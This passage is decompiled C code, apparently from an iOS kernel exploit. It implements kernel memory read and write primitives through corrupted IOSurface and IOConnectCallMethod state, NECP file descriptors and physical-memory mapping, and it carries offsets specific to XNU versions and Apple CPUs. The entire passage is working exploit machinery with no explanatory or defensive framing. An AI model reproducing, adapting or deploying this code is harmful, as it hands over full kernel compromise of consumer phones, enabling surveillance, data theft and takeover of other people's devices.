      __s1[1] = 0x6300000003uLL;
      v9 = v2 + 96;
      LODWORD(v13) = 3;
      BYTE3(v12) = 34;
      v4 = fd_write(&krwCtx->krw_pipe_0, __s1, 0xA0u);
      if ( !(uint32_t)v4 )
      {
        v4 = fd_read(v3, v6, 0xA0u);
        if ( !(uint32_t)v4 )
        {
          if ( !memcmp(__s1, v6, 0xA0u) )
            return 0;
          else
            return 708628;
        }
      }
      return v4;
    }
  }
  return v1;
}

//----- (00000000000268F8) ----------------------------------------------------
__int64 __fastcall necp_ioconnect_krw(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3, unsigned int a4, int a5)
{
  // struct_krwCtx *krwCtx; // x19
  __int64 test; // x24
  unsigned int v11; // w27
  unsigned __int64 v12; // x8
  unsigned __int64 v13; // x9
  unsigned int v14; // w28
  size_t v15; // x25
  __int64 v16; // x26
  __int64 v17; // x0
  int v18; // w0
  int v19; // w21
  int v20; // w8
  unsigned int v22; // [xsp+8h] [xbp-58h] BYREF
  int v23; // [xsp+Ch] [xbp-54h] BYREF

  test = 708609;
  if ( krwCtx->krw_pipe_0 == -1
    || krwCtx->krw_pipe_1 == -1
    || krwCtx->iosurfaceFd_size4 == -1
    || !krwCtx->gap_0x218
    || !check_kaddr_in_physmap(krwCtx, a2) )
  {
    return test;
  }
  v23 = -1;
  if ( a5 )
  {
    test = fd_open_dev_null(&v23);
    if ( (uint32_t)test )
      goto LABEL_34;
    test = fd_read_test(&krwCtx->krw_pipe_0);
    if ( (uint32_t)test )
      goto LABEL_34;
  }
  if ( !a4 )
  {
LABEL_27:
    test = pipe_krw_roundtrip_verify(krwCtx);
    goto LABEL_33;
  }
  v11 = 0;
  while ( 1 )
  {
    v12 = a4 - v11;
    v22 = 0;
    v13 = a2 + v11;
    if ( (unsigned int)v12 >= 4 )
    {
      v14 = 0;
    }
    else if ( (((v13 + (unsigned int)v12 - 1) ^ (v13 + 3)) & ~krwCtx->pageMask) != 0 )
    {
      v14 = 4 - v12;
    }
    else
    {
      v14 = 0;
    }
    if ( 4 - (unsigned __int64)v14 >= v12 )
      v15 = a4 - v11;
    else
      v15 = 4LL - v14;
    v16 = v13 - v14;
    if ( (v15 <= 3 && (v17 = kreadbuf_via_dev_null_only(krwCtx, v13 - v14, (__int64)&v22, 4u, 0), (uint32_t)v17))
      || (v17 = necp_fd_verify_roundtrip(krwCtx, v16), (uint32_t)v17) )
    {
      test = v17;
      goto LABEL_32;
    }
    memcpy((char *)&v22 + v14, (const void *)(a3 + v11), v15);
    v18 = krwCtx->iosurfaceFd_size4;
    if ( !krwCtx->gap_0x220 )
      break;
    if ( ioctl(v18, 0x8004667C, &v22) )
      goto LABEL_29;
LABEL_26:
    v11 = v11 - v14 + 4;
    if ( v11 >= a4 )
      goto LABEL_27;
  }
  if ( !fcntl(v18, 6, v22) )
    goto LABEL_26;
LABEL_29:
  v19 = errno;
  v20 = errno;
  if ( v19 < 0 )
    v20 = -v20;
  test = v20 | 0x40000000u;
LABEL_32:
  pipe_krw_roundtrip_verify(krwCtx);
LABEL_33:
  if ( a5 )
LABEL_34:
    fd_close(v23);
  return test;
}

//----- (0000000000026B00) ----------------------------------------------------
__int64 __fastcall teardown_semaphore_helper_ctx(struct_krwCtx *krwCtx, int a2)
{
  void *v2; // x19
  _opaque_pthread_t *v3; // x0
  semaphore_t v4; // w8
  semaphore_t v6; // w1
  semaphore_t v7; // w1
  int v8; // w0

  v2 = (void *)krwCtx->semaphoreHelperCtx;
  if ( v2 )
  {
    krwCtx->gap_0xC = 0;
    krwCtx->semaphoreHelperCtx = 0;
    v3 = *(_opaque_pthread_t **)v2;
    if ( *(uint64_t *)v2 )
    {
      v4 = *((uint32_t *)v2 + 2);
      if ( v4 + 1 >= 2 && a2 != 0 )
      {
        *((uint8_t *)v2 + 56) = 1;
        semaphore_signal(v4);
        v3 = *(_opaque_pthread_t **)v2;
      }
      pthread_join(v3, 0);
      *(uint64_t *)v2 = 0;
    }
    v6 = *((uint32_t *)v2 + 2);
    if ( v6 + 1 >= 2 )
    {
      semaphore_destroy(mach_task_self_, v6);
      *((uint32_t *)v2 + 2) = 0;
    }
    v7 = *((uint32_t *)v2 + 3);
    if ( v7 + 1 >= 2 )
    {
      semaphore_destroy(mach_task_self_, v7);
      *((uint32_t *)v2 + 3) = 0;
    }
    v8 = *((uint32_t *)v2 + 4);
    if ( v8 != -1 )
    {
      close(v8);
      *((uint32_t *)v2 + 4) = -1;
    }
    *((__int128 *)v2 + 2) = 0u;
    *((__int128 *)v2 + 3) = 0u;
    *(__int128 *)v2 = 0u;
    *((__int128 *)v2 + 1) = 0u;
    free(v2);
  }
  return 0;
}

//----- (0000000000026BE4) ----------------------------------------------------
__int64 __fastcall setup_iosurface_semaphore_helper(struct_krwCtx *krwCtx)
{
  __int64 v2; // x20
  uint32_t *v3; // x0
  uint32_t *v4; // x21
  kern_return_t v5; // w0
  unsigned int v7; // w0
  char i; // w23
  int v9; // w0
  mach_timespec_t v10; // x1
  pthread_t v11; // [xsp+0h] [xbp-40h] BYREF
  semaphore_t semaphore[2]; // [xsp+8h] [xbp-38h] BYREF

  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 0, 0, 0, 0) )
  {
    if ( krwCtx->gap_0xC )
    {
      return 0;
    }
    else
    {
      if ( (unsigned int)(krwCtx->iosurfaceObj + 1) <= 1 )
      {
        v7 = (unsigned int)ioservice_get_matching("AppleSEPManager");
        if ( v7 + 1 < 2 )
          return 708625;
        krwCtx->iosurfaceObj = v7;
      }
      for ( i = 0; ; i = 1 )
      {
        v9 = _IOServiceSetAuthorizationID();
        if ( v9 != -536870207 )
          break;
        if ( (i & 1) != 0 )
          return (v9 & 0xFFF) | 0x70000000u;
        if ( !(unsigned int)check_csblob_patchable(krwCtx, mach_task_self_) )
          return 163905;
      }
      if ( !v9 )
        goto LABEL_21;
      return (v9 & 0xFFF) | 0x70000000u;
    }
  }
  else
  {
    v2 = 0;
    v11 = 0;
    *(uint64_t *)semaphore = 0;
    if ( !krwCtx->gap_0xC )
    {
      v3 = calloc(1u, 0x40u);
      if ( !v3 )
        return 708617;
      v4 = v3;
      v3[4] = -1;
      krwCtx->semaphoreHelperCtx = (uint64_t)v3;
      v5 = semaphore_create(mach_task_self_, &semaphore[1], 0, 0);
      if ( !v5 )
      {
        v4[2] = semaphore[1];
        v5 = semaphore_create(mach_task_self_, semaphore, 0, 0);
        if ( !v5 )
        {
          v4[3] = semaphore[0];
          v2 = create_pthread_something(krwCtx, &v11, (__int64)necp_socket_fileport_setup, krwCtx);
          if ( (uint32_t)v2 )
            goto LABEL_7;
          *(uint64_t *)v4 = v11;
          v10 = IDA_MACH_TIMESPEC(3ULL);
          v5 = semaphore_timedwait(semaphore[0], v10);
          v2 = (unsigned int)v4[15];
          if ( (uint32_t)v2 )
            goto LABEL_7;
          if ( !v5 )
          {
LABEL_21:
            v2 = 0;
            krwCtx->gap_0xC = 1;
            return v2;
          }
        }
      }
      v2 = v5 | 0x80000000;
LABEL_7:
      teardown_semaphore_helper_ctx(krwCtx, 0);
    }
  }
  return v2;
}

//----- (0000000000026DD0) ----------------------------------------------------
__int64 __fastcall kreadbuf_via_IOConnectCallMethod(
        struct_krwCtx *krwCtx,
        unsigned __int64 a2,
        __int64 a3,
        unsigned int a4,
        int a5)
{
  // struct_krwCtx *krwCtx; // x19
  __int64 v5; // x24
  unsigned int v12; // w8
  __int64 v13; // x28
  __int64 v14; // x25
  size_t v15; // x26
  unsigned __int64 v16; // x8
  int v17; // w9
  unsigned int v18; // w8
  unsigned int v19; // w27
  mach_port_t v20; // w0
  __int64 v21; // x8
  __int64 v22; // x9
  __int64 v23; // x9
  __int64 v24; // x10
  __int128 *v25; // x9
  kern_return_t v26; // w0
  unsigned int v27; // w8
  __int64 v28; // x9
  __int64 v29; // x24
  kern_return_t v30; // w0
  __int64 v31; // x10
  unsigned int v32; // w9
  __int64 v33; // x10
  __int64 v34; // x11
  __int64 v35; // x10
  size_t v36; // x2
  __int128 v37; // [xsp+10h] [xbp-A0h]
  int v38; // [xsp+20h] [xbp-90h] BYREF
  int v39; // [xsp+24h] [xbp-8Ch] BYREF
  size_t outputStructCnt; // [xsp+28h] [xbp-88h] BYREF
  int outputStruct; // [xsp+30h] [xbp-80h] BYREF
  uint32_t outputCnt; // [xsp+34h] [xbp-7Ch] BYREF
  uint64_t output[2]; // [xsp+38h] [xbp-78h] BYREF
  uint64_t input[2]; // [xsp+48h] [xbp-68h] BYREF

  v5 = 708609;
  if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 )
  {
    if ( krwCtx->ioConnectMappedAddr )
    {
      if ( krwCtx->ioConnectMappedSize )
      {
        if ( check_kaddr_in_physmap(krwCtx, a2) )
        {
          v39 = -1;
          if ( !a5 || (v5 = fd_open_dev_null(&v39), !(uint32_t)v5) )
          {
            if ( a4 )
            {
              v12 = 0;
              while ( 1 )
              {
                v13 = v12;
                v14 = a2 + v12;
                v15 = a4 - v12;
                if ( (krwCtx->pageMask & v14) == 0 && (unsigned int)v15 >= 0x4000 )
                  break;
                if ( (unsigned int)v15 > 3 )
                  goto LABEL_26;
                if ( (((v14 + (unsigned int)v15 - 1) ^ (v14 + 3)) & ~krwCtx->pageMask) != 0 )
                  v19 = 4 - v15;
                else
                  v19 = 0;
LABEL_27:
                v20 = krwCtx->ioConnectPort;
                v5 = 708609;
                if ( v20 + 1 >= 2 )
                {
                  v21 = v14 - v19;
                  v22 = krwCtx->ioConnectMappedAddr;
                  v5 = 708609;
                  if ( krwCtx->xnuMajorVersion < 8792 )
                  {
                    if ( v22 )
                    {
                      v5 = 708609;
                      if ( krwCtx->ioConnectMappedSize )
                      {
                        v28 = krwCtx->ioConnectDataOffset + v22;
                        v29 = *(uint64_t *)(v28 + 192);
                        *(uint64_t *)(v28 + 192) = v21 - 20;
                        output[0] = 0;
                        LODWORD(outputStructCnt) = 1;
                        input[0] = krwCtx->ioConnectDataSize;
                        v30 = IOConnectCallMethod(
                                v20,
                                0x10u,
                                input,
                                1u,
                                0,
                                0,
                                output,
                                (uint32_t *)&outputStructCnt,
                                0,
                                0);
                        if ( v30 )
                        {
                          v27 = v30 | 0x80000000;
                        }
                        else
                        {
                          v27 = 0;
                          v38 = output[0];
                        }
                        v35 = krwCtx->ioConnectMappedAddr;
                        v32 = 708609;
                        if ( v35 )
                        {
                          v32 = 708609;
                          if ( krwCtx->ioConnectMappedSize )
                          {
                            v32 = 0;
                            *(uint64_t *)(krwCtx->ioConnectDataOffset + v35 + 192) = v29;
                          }
                        }
                        goto LABEL_53;
                      }
                    }
                  }
                  else if ( v22 )
                  {
                    v5 = 708609;
                    if ( krwCtx->ioConnectMappedSize )
                    {
                      v23 = krwCtx->ioConnectDataOffset + v22;
                      v24 = 1096;
                      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8796, 100, 720, 1023, 1023) )
                        v24 = 1104;
                      v25 = (__int128 *)(v23 + v24);
                      v37 = *v25;
                      *(uint64_t *)v25 = v21;
                      *((uint64_t *)v25 + 1) = 4;
                      outputStruct = 0;
                      outputCnt = 2;
                      outputStructCnt = 4;
                      input[0] = krwCtx->ioConnectDataSize;
                      input[1] = 0;
                      output[0] = 0;
                      output[1] = 0;
                      v26 = IOConnectCallMethod(
                              v20,
                              0x33u,
                              input,
                              2u,
                              0,
                              0,
                              output,
                              &outputCnt,
                              &outputStruct,
                              &outputStructCnt);
                      if ( v26 )
                      {
                        v27 = v26 | 0x80000000;
                      }
                      else
                      {
                        v27 = 0;
                        v38 = outputStruct;
                      }
                      v31 = krwCtx->ioConnectMappedAddr;
                      v32 = 708609;
                      if ( v31 )
                      {
                        v32 = 708609;
                        if ( krwCtx->ioConnectMappedSize )
                        {
                          v32 = 0;
                          v33 = krwCtx->ioConnectDataOffset + v31;
                          v34 = 1096;
                          if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8796, 100, 720, 1023, 1023) )
                            v34 = 1104;
                          *(__int128 *)(v33 + v34) = v37;
                        }
                      }
LABEL_53:
                      if ( v27 )
                        v5 = v27;
                      else
                        v5 = v32;
                      if ( !(uint32_t)v5 )
                      {
                        if ( (unsigned int)v15 >= 4 )
                          v36 = 4;
                        else
                          v36 = v15;
                        memcpy((void *)(a3 + v13), (char *)&v38 + v19, v36);
                      }
                    }
                  }
                }
                LODWORD(v15) = 4;
LABEL_29:
                if ( (uint32_t)v5 )
                  goto LABEL_62;
                v12 = v15 + v13;
                if ( (int)v15 + (int)v13 >= a4 )
                  goto LABEL_61;
              }
              if ( krw_ctx_has_read_caps(krwCtx) )
              {
                v16 = krwCtx->xnuVersionPacked;
                if ( v16 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
                  v17 = 0x4000;
                else
                  v17 = 0x80000;
                if ( v16 <= XNU_VERSION_PACKED(10001, 1023, 1023, 1023, 1023) )
                  v18 = v17;
                else
                  v18 = 528;
                if ( (unsigned int)v15 >= v18 )
                  LODWORD(v15) = v18;
                v5 = necp_semaphore_kread(krwCtx, v14, (char *)(a3 + v13), v15);
                goto LABEL_29;
              }
LABEL_26:
              v19 = 0;
              goto LABEL_27;
            }
LABEL_61:
            v5 = 0;
LABEL_62:
            if ( a5 )
              fd_close(v39);
          }
        }
      }
    }
  }
  return v5;
}

//----- (00000000000271B0) ----------------------------------------------------
__int64 __fastcall ioconnect_callmethod_write(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3, unsigned int a4, int a5)
{
  // struct_krwCtx *krwCtx; // x19
  __int64 v5; // x19
  __int64 v12; // x0
  unsigned int v13; // w27
  unsigned __int64 v14; // x8
  unsigned __int64 v15; // x9
  unsigned int v16; // w28
  size_t v17; // x26
  unsigned __int64 v18; // x25
  __int64 v19; // x0
  mach_port_t v20; // w0
  __int64 v21; // x8
  uint64_t v22; // x9
  __int64 v23; // x8
  __int64 v24; // x10
  __int64 v25; // x26
  kern_return_t v26; // w0
  __int64 v27; // x8
  __int64 v28; // x8
  __int64 v29; // x9
  uint64_t v30; // [xsp+10h] [xbp-80h] BYREF
  int v31; // [xsp+1Ch] [xbp-74h] BYREF
  uint64_t input[3]; // [xsp+20h] [xbp-70h] BYREF

  v5 = 708609;
  if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2
    && krwCtx->ioConnectMappedAddr
    && krwCtx->ioConnectMappedSize
    && check_kaddr_in_physmap(krwCtx, a2) )
  {
    v31 = -1;
    if ( !a5 || (v12 = fd_open_dev_null(&v31), !(uint32_t)v12) )
    {
      if ( a4 )
      {
        v13 = 0;
        while ( 1 )
        {
          v14 = a4 - v13;
          v30 = 0;
          v15 = a2 + v13;
          if ( (unsigned int)v14 >= 8 )
            v16 = 0;
          else
            v16 = (((v15 + (unsigned int)v14 - 1) ^ (v15 + 7)) & ~krwCtx->pageMask) != 0 ? 8 - v14 : 0;
          v17 = 8 - (unsigned __int64)v16 >= v14 ? a4 - v13 : 8LL - v16;
          v18 = v15 - v16;
          if ( v17 <= 7 )
          {
            v19 = kreadbuf_via_IOConnectCallMethod(krwCtx, v15 - v16, (__int64)&v30, 8u, 0);
            if ( (uint32_t)v19 )
              break;
          }
          memcpy((char *)&v30 + v16, (const void *)(a3 + v13), v17);
          v20 = krwCtx->ioConnectPort;
          if ( v20 + 1 < 2 )
            goto LABEL_35;
          v21 = krwCtx->ioConnectMappedAddr;
          if ( !v21 || !krwCtx->ioConnectMappedSize )
            goto LABEL_35;
          v22 = v30;
          v23 = krwCtx->ioConnectDataOffset + v21;
          v24 = 864;
          if ( krwCtx->xnuMajorVersion > 8791 )
            v24 = 872;
          v25 = *(uint64_t *)(v23 + v24);
          *(uint64_t *)(v23 + v24) = v18;
          input[0] = krwCtx->ioConnectDataSize;
          input[1] = 0;
          input[2] = v22;
          v26 = IOConnectCallMethod(v20, 0x21u, input, 3u, 0, 0, 0, 0, 0, 0);
          v27 = krwCtx->ioConnectMappedAddr;
          if ( !v27 || !krwCtx->ioConnectMappedSize )
          {
            if ( !v26 )
              goto LABEL_35;
LABEL_33:
            v5 = v26 | 0x80000000;
            goto LABEL_35;
          }
          v28 = krwCtx->ioConnectDataOffset + v27;
          v29 = 864;
          if ( krwCtx->xnuMajorVersion > 8791 )
            v29 = 872;
          *(uint64_t *)(v28 + v29) = v25;
          if ( v26 )
            goto LABEL_33;
          v13 = v13 - v16 + 8;
          if ( v13 >= a4 )
            goto LABEL_31;
        }
        v5 = v19;
      }
      else
      {
LABEL_31:
        v5 = 0;
      }
LABEL_35:
      if ( a5 )
        fd_close(v31);
      return v5;
    }
    return v12;
  }
  return v5;
}

//----- (0000000000027414) ----------------------------------------------------
__int64 __fastcall physmap_maybe(struct_krwCtx *krwCtx, vm_address_t *address, vm_size_t size, __int64 paddr)
{
  kern_return_t v4; // w0

  v4 = vm_map(mach_task_self_, address, size, 0, 1, krwCtx->ioSurfaceMemEntryMaybe, paddr & ~krwCtx->pageMask, 0, 3, 3, 2u);
  if ( v4 )
    return v4 | 0x80000000;
  else
    return 0;
}

//----- (0000000000027478) ----------------------------------------------------
__int64 __fastcall cleanup_ioconnect_resources(__int64 a1)
{
  io_object_t v2; // w0
  vm_address_t v3; // x1
  vm_size_t v4; // x2
  mach_port_name_t v5; // w1

  v2 = *(uint32_t *)(a1 + 92);
  if ( v2 + 1 >= 2 )
  {
    IOObjectRelease(v2);
    *(uint32_t *)(a1 + 92) = 0;
  }
  v3 = *(uint64_t *)(a1 + 96);
  if ( v3 )
  {
    v4 = *(uint64_t *)(a1 + 104);
    if ( v4 )
    {
      vm_deallocate(mach_task_self_, v3, v4);
      *(uint64_t *)(a1 + 96) = 0;
      *(uint64_t *)(a1 + 104) = 0;
    }
  }
  *(uint64_t *)(a1 + 112) = 0;
  *(uint64_t *)(a1 + 120) = 0;
  v5 = *(uint32_t *)(a1 + 88);
  if ( v5 + 1 >= 2 )
  {
    mach_port_deallocate(mach_task_self_, v5);
    *(uint32_t *)(a1 + 88) = 0;
  }
  return 0;
}

//----- (0000000000027504) ----------------------------------------------------
__int64 __fastcall setup_physmap_krw(struct_krwCtx *krwCtx, char a2)
{
  enum
  {
    ERR_BAD_INPUT = 708609,
    ERR_NOT_FOUND = 708625,
    ERR_BAD_BRANCH = 708628,
    ERR_KREAD = 163855,
    ERR_INVALID_KADDR = 163878,
  };
  SearchObj textRange; // [xsp+28h] [xbp-68h] BYREF
  SearchObj scanRange; // [xsp+10h] [xbp-80h] BYREF
  uint64_t physmapEndKaddr; // [xsp+8h] [xbp-88h] BYREF
  uint64_t percpuGlobalValue;

  if ( !krwCtx->physmapBasePhys || !krwCtx->physmapSize )
  {
    if ( (a2 & 1) != 0 )
      return ERR_BAD_INPUT;

    macho_find_text_section(krwCtx->kernelMachoCtx, &textRange.field_0x00);
    textRange.base_ptr += textRange.size - 0x20000;
    textRange.size = 0x20000;
    scanRange = textRange;

    uint64_t patternHit = kernel_pattern_scan(&scanRange, "88 91 00 B9 9F 0D 00 B9", 0);
    if ( !patternHit )
      return ERR_NOT_FOUND;

    uint64_t firstGlobalRef = 0;
    uint64_t secondGlobalRef = 0;
    for ( int64_t off = -4; off < 0xFC; off += 4 )
    {
      uint32_t adrpInsn = macho_read_u32(krwCtx->kernelMachoCtx, (__int64 *)(patternHit + off + 4));
      uint32_t ldrInsn = macho_read_u32(krwCtx->kernelMachoCtx, (__int64 *)(patternHit + off + 8));
      if ( (adrpInsn & 0x9F000000) != 0x90000000 || (ldrInsn & 0xBFC00000) != 0xB9400000 )
        continue;

      uint64_t globalRef = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(patternHit + off + 4));
      if ( !globalRef )
        return ERR_NOT_FOUND;
      if ( firstGlobalRef )
      {
        secondGlobalRef = globalRef;
        break;
      }
      firstGlobalRef = globalRef;
    }
    if ( !secondGlobalRef )
      return ERR_NOT_FOUND;

    if ( !kread_physmap_decorated(krwCtx, firstGlobalRef, &scanRange.field_0x00) )
      return ERR_KREAD;
    uint64_t physmapBaseKaddr = scanRange.field_0x00;
    if ( !validate_kaddr_range(krwCtx, physmapBaseKaddr) )
      return ERR_INVALID_KADDR;
    if ( !kread_physmap_decorated(krwCtx, secondGlobalRef, &physmapEndKaddr) )
      return ERR_KREAD;
    if ( !validate_kaddr_range(krwCtx, physmapEndKaddr) )
      return ERR_INVALID_KADDR;

    uint64_t physmapBasePhys = kaddr_to_phys_v1(krwCtx, physmapBaseKaddr);
    if ( !physmapBasePhys )
      return ERR_INVALID_KADDR;

    krwCtx->physmapBasePhys = physmapBasePhys;
    krwCtx->physmapSize = (uint32_t)(physmapEndKaddr - physmapBaseKaddr);
  }

  if ( krwCtx->percpuBasePhys && krwCtx->percpuSize )
    return 0;
  if ( (a2 & 1) != 0 )
    return ERR_BAD_INPUT;

  macho_getsectbyname("__DATA", krwCtx->kernelMachoCtx, "__percpu", &textRange.field_0x00);
  uint64_t percpuBase = textRange.base_ptr;
  uint32_t percpuSize = (uint32_t)textRange.size;
  if ( !percpuBase || !percpuSize )
    return ERR_NOT_FOUND;

  macho_find_text_section(krwCtx->kernelMachoCtx, &textRange.field_0x00);
  if ( !textRange.base_ptr || !textRange.size )
    return ERR_NOT_FOUND;
  textRange.base_ptr += textRange.size - 0x20000;
  textRange.size = 0x20000;

  uint64_t percpuPattern = kernel_pattern_scan(&textRange, ".. 02 00 F9 E1 03 13 AA", 0);
  if ( !percpuPattern )
    return ERR_NOT_FOUND;
  uint64_t percpuGlobalRef = find_kernel_func_by_branch(krwCtx->kernelMachoCtx, (__int64 *)(percpuPattern - 8), 0);
  if ( !percpuGlobalRef )
    return ERR_BAD_BRANCH;

  if ( !kread64_internal(krwCtx, percpuGlobalRef, &percpuGlobalValue) )
    return ERR_KREAD;

  uint64_t percpuKaddr = percpuGlobalValue + percpuBase;
  if ( !validate_kaddr_range(krwCtx, percpuKaddr) )
    return ERR_INVALID_KADDR;

  uint64_t percpuPhys = kaddr_to_phys_v1(krwCtx, percpuKaddr);
  if ( !percpuPhys )
    return ERR_INVALID_KADDR;

  uint32_t pageMask = krwCtx->pageMask;
  krwCtx->percpuBasePhys = percpuPhys;
  krwCtx->percpuSize = (pageMask + percpuSize) & ~pageMask;
  return 0;
}

//----- (0000000000027808) ----------------------------------------------------
__int64 __fastcall krw_read_validation(struct_krwCtx *krwCtx, char a2)
{
  enum
  {
    ERR_ALLOC = 708617,
    ERR_BAD_CPU = 708628,
    ERR_THREAD_PORT = 163848,
    ERR_INVALID_KADDR = 163878,
    ERR_UNSUPPORTED_XNU = 163884,
    ERR_TIMEOUT = 2147483697,
  };
  // struct_krwCtx *krwCtx; // x19
  vm_size_t v4; // x19
  __int64 v6; // x21
  unsigned int v10; // w27
  kern_return_t v11; // w0
  int v12; // w8
  unsigned __int64 v13; // x21
  bool v14; // zf
  int v15; // w8
  int v16; // w9
  void *(__cdecl *v17)(void *); // x0
  int v18; // w0
  int v19; // w8
  int v20; // w26
  unsigned int v21; // w24
  mach_port_t v22; // w0
  mach_port_t v23; // w26
  unsigned __int64 v24; // x0
  unsigned __int64 v25; // x0
  __int64 v26; // x27
  semaphore_t v27; // w25
  int v29; // w25
  __int64 v30; // x28
  __int64 v31; // x3
  vm_size_t v32; // x22
  __int64 v33; // x0
  void *v34; // x23
  void *v35; // x0
  int v36; // w8
  char *v37; // x9
  int v38; // w10
  char *v39; // x11
  __int64 v40; // x12
  char *v41; // x24
  kern_return_t v42; // w0
  int v43; // w9
  size_t v44; // x25
  int v45; // w0
  int v46; // w8
  unsigned int v47; // w8
  void *v48; // x0
  uint64_t v49; // x8
  _opaque_pthread_t *v50; // x0
  mach_port_t v51; // w0
  semaphore_t v52; // w8
  __int64 v53; // x28
  unsigned int v54; // w28
  __int64 v55; // x8
  unsigned __int64 v56; // x8
  __int64 v57; // x27
  unsigned __int64 v58; // x25
  pthread_t *v59; // x28
  void *(__cdecl *v60)(void *); // x0
  int v61; // w0
  int v62; // w0
  unsigned int v63; // w8
  unsigned __int64 v64; // x21
  __int64 v65; // x9
  _opaque_pthread_t *v66; // x0
  int v67; // w0
  int v68; // w8
  int v69; // w8
  int v70; // w8
  int v71; // w26
  pthread_t *v72; // x0
  unsigned int v73; // w9
  unsigned __int64 v74; // x28
  vm_address_t v75; // x1
  vm_size_t v76; // x2
  __int64 *v78; // x22
  unsigned int v79; // [xsp+4h] [xbp-7Ch]
  uint64_t v80; // [xsp+8h] [xbp-78h]
  unsigned int v81; // [xsp+10h] [xbp-70h]
  vm_address_t address; // [xsp+18h] [xbp-68h] BYREF
  pthread_t v83; // [xsp+20h] [xbp-60h] BYREF
  semaphore_t semaphore; // [xsp+2Ch] [xbp-54h] BYREF

  address = 0;
  v4 = vm_page_size;
  uint32_t xnuMajor = krwCtx->xnuMajorVersion;
  v6 = ERR_UNSUPPORTED_XNU;
  switch ( xnuMajor )
  {
    case 7195:
    case 8019:
    case 8020:
    case 8792:
    case 8796:
    case 10002:
      break;
    default:
      return v6;
  }
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17) )
  {
    v10 = 264;
  }
  else
  {
    v10 = 184;
    if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
    {
      if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11) )
        v10 = 184;
      else
        v10 = 256;
    }
  }
  if ( krwCtx->iogpuKreadFn && (a2 & 1) == 0 )
  {
    v83 = 0;
    semaphore = 0;
    v11 = semaphore_create(mach_task_self_, &semaphore, 0, 0);
    if ( v11 )
    {
      v6 = v11 | 0x80000000;
    }
    else
    {
      v17 = (void *(__cdecl *)(void *))nullsub_1(semaphore_wait_wrapper);
      v18 = pthread_create(&v83, 0, v17, (void *)semaphore);
      if ( v18 )
      {
        if ( v18 >= 0 )
          v19 = v18;
        else
          v19 = -v18;
        v6 = v19 | 0x40000000u;
      }
      else
      {
        v22 = pthread_mach_thread_np(v83);
        if ( v22 + 1 < 2 )
        {
          v6 = ERR_THREAD_PORT;
        }
        else
        {
          v23 = v22;
          v24 = get_task_kobject_addr(krwCtx, v22);
          if ( v24 )
          {
            v25 = kaddr_to_phys_v1(krwCtx, v24 + v10);
            if ( v25 )
            {
              v26 = v25;
              v27 = semaphore;
              goto LABEL_155;
            }
          }
          v6 = ERR_INVALID_KADDR;
        }
      }
    }
    if ( semaphore + 1 >= 2 )
    {
      semaphore_signal(semaphore);
      semaphore_destroy(mach_task_self_, semaphore);
    }
    if ( v83 )
      pthread_join(v83, 0);
    goto LABEL_158;
  }
  v6 = setup_physmap_krw(krwCtx, a2);
  if ( (uint32_t)v6 )
  {
LABEL_158:
    if ( address && v4 )
      vm_deallocate(mach_task_self_, address, v4);
    return v6;
  }
  v20 = 48;
  v12 = krwCtx->xnuMajorVersion;
  switch ( v12 )
  {
    case 8019:
      if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 79, 1023, 1023, 1023) )
        v21 = 9728;
      else
        v21 = 9744;
      break;
    case 8020:
      v21 = 9728;
      goto LABEL_66;
    case 8792:
      if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) )
        v21 = 9952;
      else
        v21 = 9936;
      break;
    case 8796:
      v21 = 9904;
      goto LABEL_66;
    case 10002:
      v20 = 40;
      v13 = krwCtx->xnuVersionPacked;
      v14 = !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT);
      if ( v13 < XNU_VERSION_PACKED(10002, 42, 8, 0, 0) )
      {
        v15 = 17904;
        v16 = 10160;
      }
      else
      {
        v15 = 17936;
        v16 = 10192;
      }
      if ( v14 )
        v21 = v16;
      else
        v21 = v15;
      break;
    default:
LABEL_76:
      v6 = ERR_UNSUPPORTED_XNU;
      goto LABEL_158;
  }
LABEL_66:
  v29 = number_of_cpus();
  v30 = (unsigned int)(v29 - 1);
  v31 = krwCtx->percpuBasePhys;
  v83 = 0;
  v32 = (unsigned int)(krwCtx->percpuSize * v30);
  v33 = map_physpage_with_mem_entry(krwCtx, (vm_address_t *)&v83, v32, v31);
  if ( (uint32_t)v33 )
  {
    v6 = v33;
    v27 = 0;
    v23 = 0;
    v26 = 0;
    v34 = 0;
    goto LABEL_146;
  }
  v6 = ERR_ALLOC;
  v35 = calloc(v29, 8u);
  v34 = v35;
  if ( !v35 )
  {
LABEL_142:
    v27 = 0;
    v23 = 0;
    v26 = 0;
    goto LABEL_146;
  }
  if ( v29 != 1 )
  {
    v36 = 0;
    v37 = (char *)v83 + v21;
    v38 = krwCtx->percpuSize;
    do
    {
      v39 = &v37[v36];
      v40 = *(unsigned __int16 *)v39;
      if ( v29 <= (int)v40 )
      {
        v27 = 0;
        v23 = 0;
        v26 = 0;
        v6 = ERR_BAD_CPU;
        goto LABEL_146;
      }
      *((uint64_t *)v35 + v40) = v39;
      v36 += v38;
      --v30;
    }
    while ( v30 );
  }
  semaphore = 0;
  v41 = (char *)calloc(1u, 0x90u);
  if ( !v41 )
  {
    v43 = 0;
    LODWORD(v44) = 0;
    goto LABEL_130;
  }
  v42 = semaphore_create(mach_task_self_, &semaphore, 0, 0);
  if ( v42 )
  {
    v43 = 0;
    LODWORD(v44) = 0;
    v6 = v42 | 0x80000000;
    goto LABEL_130;
  }
  *((uint32_t *)v41 + 4) = v29;
  *((uint32_t *)v41 + 5) = v20;
  *((uint32_t *)v41 + 31) = 0;
  *(uint64_t *)v41 = (uint64_t)krwCtx;
  *((uint64_t *)v41 + 1) = v34;
  *((uint32_t *)v41 + 24) = v10;
